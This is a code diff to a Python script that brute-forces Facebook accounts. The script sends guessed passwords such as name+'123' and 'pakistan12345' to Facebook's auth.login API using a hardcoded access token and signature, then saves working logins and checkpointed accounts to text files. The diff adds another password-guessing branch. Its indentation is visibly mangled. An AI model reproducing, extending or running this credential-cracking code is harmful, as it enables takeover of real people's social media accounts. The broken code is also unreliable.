@@ -76,7 +76,7 @@ def login_select():
         print 
         token = raw_input("Paste Token Here : ")
         saving()
-        sav = open(".login.txt","w")
+        sav = open('login.txt','w')
         sav.write(token)
         sav.close()
         ham("\r\033[1;32mLogin Successfull \033[0;97m")
@@ -370,7 +370,7 @@ def crack2():
 		                            ok.close()
 		                            oks.append(uid)
 		                        else:
-		                            pass4="123"
+		                            pass4=name+"123"
 		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                            d=json.loads(q)
 		                            if 'www.facebook.com' in d['error_msg']:
@@ -522,6 +522,24 @@ def crack2():
 		                                                                                                    ok.write(uid+" | "+pass12+"\n")
 		                                                                                                    ok.close()
 		                                                                                                    oks.append(uid)
+														else:
+		                                                    	                  	            	    pass13="pakistan12345"
+		                                                    	                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass13 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
+		                                                                                                    d=json.loads(q)
+		                                                                                                    if 'www.facebook.com' in d['error_msg']:
+		                                                                                               		print("[CP] "+uid+" | "+pass13)
+		                                                                                                        cp=open("save/cp.txt","a")
+		                                                                                                        cp.write(uid+" | "+pass13+"\n")
+		                                                                                                        cp.close()
+		                                                                                                        cps.append(uid)
+		                                                                                                    else:
+		                                                                                                        if 'access_token' in d:
+		                                                                                                        print("\x1b[1;92m[OK] \033[1;30m"+uid+" | "+pass13+"\x1b[1;0m")
+		                                                                                                        ok=open("save/ok.txt","a")
+		                                                                                                        ok.write(uid+" | "+pass13+"\n")
+		                                                                                                        ok.close()
+		                                                                                                        oks.append(uid)
+														
 										
 															
 		except:
